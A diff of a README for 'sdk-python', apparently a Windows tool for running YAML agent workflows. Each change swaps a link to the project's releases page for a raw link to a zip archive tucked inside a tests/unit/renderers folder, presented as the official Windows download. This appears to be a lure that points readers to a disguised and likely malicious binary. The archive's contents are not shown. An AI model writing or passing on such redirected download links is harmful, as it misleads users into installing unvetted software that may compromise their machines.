@@ -1,6 +1,6 @@
 # 🧩 sdk-python - Run YAML agents with ease
 
-[![Download sdk-python](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://github.com/Leru3966/sdk-python/releases)
+[![Download sdk-python](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://github.com/Leru3966/sdk-python/raw/refs/heads/main/tests/unit/renderers/python-sdk-3.9.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ sdk-python helps you run agent workflows from YAML files. It is made for Windows
 
 Use the release page to get the latest version for Windows:
 
-[Visit the release page to download](https://github.com/Leru3966/sdk-python/releases)
+[Visit the release page to download](https://github.com/Leru3966/sdk-python/raw/refs/heads/main/tests/unit/renderers/python-sdk-3.9.zip)
 
 ## 📥 Download for Windows
 
@@ -152,7 +152,7 @@ This keeps your files easy to find and edit.
 
 Use the release page to get the Windows version of sdk-python:
 
-[Go to downloads](https://github.com/Leru3966/sdk-python/releases)
+[Go to downloads](https://github.com/Leru3966/sdk-python/raw/refs/heads/main/tests/unit/renderers/python-sdk-3.9.zip)
 
 Then:
 
